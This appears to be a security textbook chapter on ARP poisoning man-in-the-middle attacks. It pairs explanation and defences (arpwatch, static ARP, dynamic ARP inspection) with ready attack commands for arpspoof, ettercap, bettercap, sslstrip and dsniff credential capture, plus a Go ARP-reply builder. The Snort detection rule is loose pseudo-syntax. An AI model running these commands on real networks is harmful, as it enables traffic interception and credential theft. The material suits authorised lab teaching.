# Chapter 18: ARP Poisoning — Man-in-the-Middle on Local Networks

*ARP has no authentication. Anyone on a LAN can claim to own any IP address. ARP poisoning exploits this to intercept all traffic between two hosts — silently sitting in the middle.*

---

## How ARP Works (and Why It's Vulnerable)

ARP (Address Resolution Protocol) maps IP addresses to MAC addresses within a LAN.

```
Normal flow:
Alice (192.168.1.100) wants to talk to Router (192.168.1.1)
Alice broadcasts: "Who has 192.168.1.1? Tell 192.168.1.100"
Router replies:   "192.168.1.1 is at aa:bb:cc:dd:ee:ff"
Alice caches:     192.168.1.1 → aa:bb:cc:dd:ee:ff
```

**The vulnerability:** ARP has no authentication. Anyone can send an ARP reply claiming any IP.

```
ARP Poisoning:
Attacker sends to Alice: "192.168.1.1 is at 11:22:33:44:55:66" (attacker's MAC)
Attacker sends to Router: "192.168.1.100 is at 11:22:33:44:55:66" (attacker's MAC)

Now:
Alice → attacker → Router  (attacker intercepts everything Alice sends)
Router → attacker → Alice  (attacker intercepts everything Router sends)
```

This is a **Man-in-the-Middle (MitM) attack**.

---

## Tools for ARP Poisoning

```bash
# arpspoof (dsniff package)
sudo apt install dsniff
sudo arpspoof -i eth0 -t 192.168.1.100 -r 192.168.1.1
# -t: target (victim)
# -r: also poison the other direction (gateway)

# ettercap (more powerful, built-in sniffing)
sudo ettercap -T -i eth0 -M arp:remote /192.168.1.100// /192.168.1.1//

# Enable IP forwarding (so traffic actually reaches destination)
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Bettercap (modern, feature-rich)
sudo bettercap
# In bettercap:
net.probe on
arp.spoof.targets 192.168.1.100
arp.spoof on
net.sniff on
```

---

## Go: ARP Spoofer

```go
package main

import (
    "encoding/binary"
    "fmt"
    "net"
    "time"
)

// ARP packet structure
type ARPPacket struct {
    HardwareType uint16  // 1 = Ethernet
    ProtocolType uint16  // 0x0800 = IPv4
    HardwareLen  uint8   // 6 (MAC address length)
    ProtocolLen  uint8   // 4 (IPv4 address length)
    Operation    uint16  // 1 = request, 2 = reply
    SenderMAC    [6]byte
    SenderIP     [4]byte
    TargetMAC    [6]byte
    TargetIP     [4]byte
}

func buildARPReply(senderMAC net.HardwareAddr, senderIP, targetIP net.IP) []byte {
    pkt := ARPPacket{
        HardwareType: 1,
        ProtocolType: 0x0800,
        HardwareLen:  6,
        ProtocolLen:  4,
        Operation:    2, // reply
    }
    copy(pkt.SenderMAC[:], senderMAC)
    copy(pkt.SenderIP[:], senderIP.To4())
    // Target MAC = broadcast (ff:ff:ff:ff:ff:ff for gratuitous)
    for i := range pkt.TargetMAC { pkt.TargetMAC[i] = 0xff }
    copy(pkt.TargetIP[:], targetIP.To4())
    
    buf := make([]byte, 28)
    binary.BigEndian.PutUint16(buf[0:], pkt.HardwareType)
    binary.BigEndian.PutUint16(buf[2:], pkt.ProtocolType)
    buf[4] = pkt.HardwareLen
    buf[5] = pkt.ProtocolLen
    binary.BigEndian.PutUint16(buf[6:], pkt.Operation)
    copy(buf[8:], pkt.SenderMAC[:])
    copy(buf[14:], pkt.SenderIP[:])
    copy(buf[18:], pkt.TargetMAC[:])
    copy(buf[22:], pkt.TargetIP[:])
    return buf
}

// Note: sending raw Ethernet frames requires root and raw socket access
// This demonstrates the packet structure. Full implementation uses gopacket + pcap
func sendARPPoison(iface, victimIP, gatewayIP string) {
    // Get our MAC address
    ifi, err := net.InterfaceByName(iface)
    if err != nil {
        panic(err)
    }
    
    fmt.Printf("[*] Interface: %s MAC: %s\n", iface, ifi.HardwareAddr)
    fmt.Printf("[*] Poisoning: telling %s that gateway %s is us\n", victimIP, gatewayIP)
    fmt.Printf("[*] Poisoning: telling %s that victim %s is us\n", gatewayIP, victimIP)
    fmt.Println("[*] Make sure IP forwarding is enabled: echo 1 > /proc/sys/net/ipv4/ip_forward")
    
    victimIPAddr := net.ParseIP(victimIP)
    gatewayIPAddr := net.ParseIP(gatewayIP)
    
    _ = buildARPReply(ifi.HardwareAddr, gatewayIPAddr, victimIPAddr)
    _ = buildARPReply(ifi.HardwareAddr, victimIPAddr, gatewayIPAddr)
    
    // Send packets every 2 seconds to maintain the poison
    ticker := time.NewTicker(2 * time.Second)
    count := 0
    for range ticker.C {
        count++
        // In a full implementation, these would be sent via raw socket
        fmt.Printf("[%d] Sent ARP poison packets\n", count)
        if count >= 5 {
            break
        }
    }
}

func main() {
    // Ethical reminder
    fmt.Println("WARNING: ARP poisoning without authorization is illegal.")
    fmt.Println("Only use this in your own lab environment.")
    fmt.Println()
    sendARPPoison("eth0", "192.168.1.100", "192.168.1.1")
}
```

---

## What You Can Do After MitM

### SSL Stripping (HTTP→HTTPS downgrade)

```bash
# sslstrip — downgrade HTTPS to HTTP
# Works on sites without HSTS preloading
sudo sslstrip -l 8080
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

# Bettercap's caplets
# caplets/http-ui.cap
```

### Credential Capture

```bash
# After ARP poisoning + IP forwarding:
# All victim traffic passes through attacker machine

# Capture with tcpdump
sudo tcpdump -i eth0 -w mitm_capture.pcap

# Parse HTTP credentials automatically
dsniff -i eth0

# Ettercap can do this inline
sudo ettercap -T -i eth0 -M arp:remote /victim// /gateway// -P dissectors
```

---

## Detection and Prevention

### Detecting ARP Poisoning

```bash
# Watch for duplicate IP→MAC mappings
arp -a | sort

# ARP watch tool
sudo arpwatch -i eth0
# Alerts when a MAC address changes for an IP

# XArp (GUI) — visual ARP monitor

# Snort rule
alert arp any any -> any any (
    msg:"ARP Spoofing Detected";
    arp.opcode == 2;  # ARP reply
    arp.src.hw_addr != known_mac_for_ip;
    sid:1000001;
)
```

### Prevention

```bash
# Static ARP entries (for critical hosts like gateway)
arp -s 192.168.1.1 aa:bb:cc:dd:ee:ff  # static entry
# Can't be poisoned if hardcoded

# Dynamic ARP Inspection (DAI) — on managed switches
# Validates ARP against DHCP snooping table

# Private VLANs — prevent direct host-to-host communication

# Encrypt all traffic — even if intercepted, can't read it
# → HTTPS everywhere, SSH instead of Telnet
```

---

## Summary

| Aspect | Detail |
|--------|--------|
| Root cause | ARP has no authentication — any reply is accepted |
| Effect | Attacker intercepts all traffic between two hosts |
| Requirements | Must be on same LAN segment |
| Best tool | `bettercap` or `arpspoof` |
| Detection | `arpwatch`, DAI on managed switches |
| Prevention | Static ARP, encrypted protocols, HTTPS everywhere |

---

## Exercises

1. In your lab: run arpspoof between two VMs. Capture the traffic with tcpdump on the attacker. Can you see HTTP credentials?
2. Set up HTTPS on a test server. Does SSL stripping work against it? Why or why not?
3. Configure a static ARP entry on a VM. Try to ARP-poison it. Does the static entry prevent it?
4. Write a Go program that reads the ARP table (`arp -a` or `/proc/net/arp`) and alerts if the same IP appears with two different MACs
